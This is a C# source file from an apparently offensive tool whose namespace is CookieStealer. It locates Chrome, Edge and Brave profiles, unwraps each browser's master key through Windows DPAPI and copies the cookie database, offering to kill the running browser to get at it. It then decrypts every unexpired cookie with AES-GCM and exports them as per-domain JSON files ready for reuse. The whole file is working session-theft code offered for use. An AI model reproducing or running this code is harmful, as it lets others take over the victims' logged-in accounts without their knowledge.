using System.Diagnostics;

namespace CookieStealer.Cookies;

using System;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using Microsoft.Data.Sqlite;


public class Extractor
{
    class LocalStateDto
    {
        [JsonPropertyName("os_crypt")]
        public OsCrypt OsCrypt { get; set; }
    }

    class OsCrypt
    {
        [JsonPropertyName("encrypted_key")]
        public string EncryptedKey { get; set; }
    }

    private const string CookiesFileName = @"Default\Network\Cookies";
    private const string LocalStateFileName = "Local State";
    private const string DecryptedCookiesFileName =  "Cookies_Decrypted";
    private string _workingDirectory;

    private readonly string _userDomainName = Environment.UserDomainName;
    private readonly string _userName = Environment.UserName;
    private Dictionary<string, string> _discoveredBrowsers = new Dictionary<string, string>();
    

    public Extractor()
    {
        var localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        var appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        
        var browsersList = new Dictionary<string, string>
        {
            {"Chrome", @$"{localAppDataPath}\Google\Chrome\User Data"},
            {"MsEdge", @$"{localAppDataPath}\Microsoft\Edge\User Data"},
            // {"Firefox", @$"{appDataPath}\Mozilla\Firefox\Profiles\<someString>.default"}, // different approach
            // {"Opera", @$"{appDataPath}\Opera Software\Opera Stable\User Data"},
            // {"OperaGX", @$"{appDataPath}\Opera Software\Opera GX Stable\User Data"}, // different location
            {"Brave", @$"{localAppDataPath}\BraveSoftware\Brave-Browser\User Data"},
        };

        foreach (var browser in browsersList.Where(browser => Path.Exists(browser.Value)))
        {
            _discoveredBrowsers.Add(browser.Key, browser.Value);
        }
        
        
        var now = DateTime.Now;
        var currentTime = now.ToString("ddMMyyHHmm");

        _workingDirectory = @$"extracted\{_userDomainName}\{_userName}\{currentTime}";

        foreach (var path in _discoveredBrowsers.Keys
                     .Select(browserName =>
                         @$"{_workingDirectory}\{browserName}\database")
                     .Where(path => !Directory.Exists(path)))
        {
            Directory.CreateDirectory(path);
        }
        
    }
    
    
    public void GrabAndRun()
    {
        foreach (var browser in _discoveredBrowsers)
        {
            var currentDirectory = Path.Combine(_workingDirectory + @$"\{browser.Key}", "database");
            var key = GetKey(browser.Value);
            File.WriteAllBytes(@$"{currentDirectory}\master.key", key);
            var cookiePath = Path.Combine(browser.Value, CookiesFileName);

            try
            {
                File.Copy(cookiePath, currentDirectory + @"\Cookie");
            }
            catch (IOException e)
            {
                Console.WriteLine($"Can't copy Cookie file because browser is currently running. Do you want to terminate {browser.Key}? [Y/N]");
                var ans1 = Console.ReadKey();

                switch (ans1.KeyChar)
                {
                    case 'y':
                        Console.Clear();
                        var processes = Process.GetProcessesByName(browser.Key.ToLower());

                        foreach (var process in processes)
                        {
                            process.CloseMainWindow();
                            if (!process.WaitForExit(3000))
                            {
                                Console.WriteLine("Couldn't terminate the process. Do you want to kill it? [Y/N]");
                                var ans2 = Console.ReadKey();

                                switch (ans2.KeyChar)
                                {
                                    case 'y':
                                        process.Kill();
                                        Thread.Sleep(500);
                                        break;
                                    case 'n':
                                        break;
                                }
                                
                            }
                        }
                        
                        File.Copy(cookiePath, currentDirectory + @"\Cookie");
                        break;
                        
                    case 'n':
                        Console.Clear();
                        break;
                }
                
            }

        }
    }
    
    private static byte[] GetKey(string baseFolder)
    {
        var file = Path.Combine(baseFolder, LocalStateFileName);
        var localStateContent = File.ReadAllText(file);
        var localState = JsonSerializer.Deserialize<LocalStateDto>(localStateContent);
        var encryptedKey = localState?.OsCrypt?.EncryptedKey;

        var keyWithPrefix = Convert.FromBase64String(encryptedKey);
        var key = keyWithPrefix[5..];
        var masterKey = ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
        return masterKey;
    }
    
    public void DecryptAndExtract()
    {
        foreach (var browser in _discoveredBrowsers)
        {
            var currentDirectory = Path.Combine(_workingDirectory + $"\\{browser.Key}", "database");
            var key = File.ReadAllBytes(currentDirectory + "\\master.key");
            ReadFromDb(currentDirectory, key);
            ExtractCookies(currentDirectory, currentDirectory + "\\..");
        }
    }
    
    private void ReadFromDb(string cookieDirectory, byte[] key)
    {
        ICollection<Cookie> result = new List<Cookie>();
        
        var dbFileName = cookieDirectory + "\\Cookie";
        var dbCopyFileName = Path.Combine(cookieDirectory, DecryptedCookiesFileName);
        
        File.Copy(dbFileName, dbCopyFileName, true);

        using var connection = new SqliteConnection($"Data Source={dbCopyFileName}");
    
        connection.Open();

        var expireTime = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
        var command = connection.CreateCommand();
        command.CommandText =
            """
            select     *
            from cookies
            WHERE has_expires = 0 or (has_expires = 1 and expires_utc > $expireTime)
                                
            """;
        command.Parameters.AddWithValue("$expireTime", expireTime);
        
        var countCommand = connection.CreateCommand();
        countCommand.CommandText =
            """
            select     COUNT(*)
            from cookies
            WHERE has_expires = 0 or (has_expires = 1 and expires_utc > $expireTime)
            """;
        countCommand.Parameters.AddWithValue("$expireTime", expireTime);
        var totalRows = Convert.ToInt32(countCommand.ExecuteScalar());
        
        
        Console.Write("Decrypting cookies... ");
        using (var progress = new ProgressBar())
        {

            using var reader = command.ExecuteReader();

            while (reader.Read())
            {
                var name = reader["name"].ToString();
                if (string.IsNullOrEmpty(name))
                {
                    // TODO
                    // ISSUE WITH A FIELD / APPEND DOMAIN AND TIME TO LOG 
                    continue;
                }

                var path = reader["path"].ToString();
                var domain = reader["host_key"].ToString();
                var encrypted_value = (byte[])reader["encrypted_value"];
                var creation_utc = reader["creation_utc"].ToString();

                var value = DecryptCookie(key, encrypted_value);

                var cookie = new Cookie(name, value, path, domain);
                result.Add(cookie);

                using var updateCommand = connection.CreateCommand();
                updateCommand.CommandText =
                    """
                    UPDATE cookies
                    SET value = $value
                    WHERE creation_utc = $creation_utc
                    """;
                updateCommand.Parameters.AddWithValue("$value", value);
                updateCommand.Parameters.AddWithValue("$creation_utc", creation_utc);
                updateCommand.ExecuteNonQuery();
                
                progress.Report((double)result.Count / totalRows);
            }
        }
        Console.WriteLine("Done.");
    }

    private static string DecryptCookie(byte[] masterKey, byte[] cookie)
    {
        var nonce = cookie[3..15];
        var ciphertext = cookie[15..^16];
        var tag = cookie[^16..(cookie.Length)];

        var resultBytes = new byte[ciphertext.Length];
        
        using var aesGcm = new AesGcm(masterKey);
        aesGcm.Decrypt(nonce, ciphertext, tag, resultBytes);
        var cookieValue = Encoding.UTF8.GetString(resultBytes);
        return cookieValue;
    }
    
    
    private static void ExtractCookies(string cookiesPath, string extractionPath)
    {
        using var connection = new SqliteConnection($"Data Source={cookiesPath + "\\Cookie"}");
        connection.Open();

        var command = connection.CreateCommand();
        command.CommandText =
            """
            SELECT host_key as domain,
                   expires_utc as expirationDate,
                   host_key as hostOnly,
                   is_httponly as httpOnly,
                   name,
                   path,
                   samesite as sameSite,
                   is_secure as secure,
                   is_persistent as session,
                   null as storeID,
                   value
            FROM cookies
            """;


        var cookies = new Dictionary<string, List<dynamic>>();
        using var reader = command.ExecuteReader();
        while (reader.Read())
        {
            var cookie = new
            {
                domain = reader["domain"].ToString(),
                expirationDate =
                    Translator.ConvertExpiresUtcToExpirationDate(Convert.ToDecimal(reader["expirationDate"])),
                hostOnly = Translator.HostOnly(reader["hostOnly"].ToString()),
                httpOnly = Convert.ToBoolean(reader["httpOnly"]),
                name = reader["name"].ToString(),
                path = reader["path"].ToString(),
                sameSite = Translator.SameSite(Convert.ToInt16(reader["sameSite"])),
                secure = Convert.ToBoolean(reader["secure"]),
                session = Convert.ToBoolean(reader["session"]),
                storeID = reader["storeID"],
                value = reader["value"].ToString()
            };

            var domain = Translator.FileName(cookie.domain);
            if (!cookies.ContainsKey(domain))
            {
                cookies[domain] = new List<dynamic>();
            }

            cookies[domain].Add(cookie);
        }

        foreach (var domain in cookies.Keys)
        {
            var json = Newtonsoft.Json.JsonConvert.SerializeObject(cookies[domain],
                Newtonsoft.Json.Formatting.Indented);
            var path = Path.Combine(extractionPath, $"{domain}.json");
            File.WriteAllText(path, json);
        }
    }
}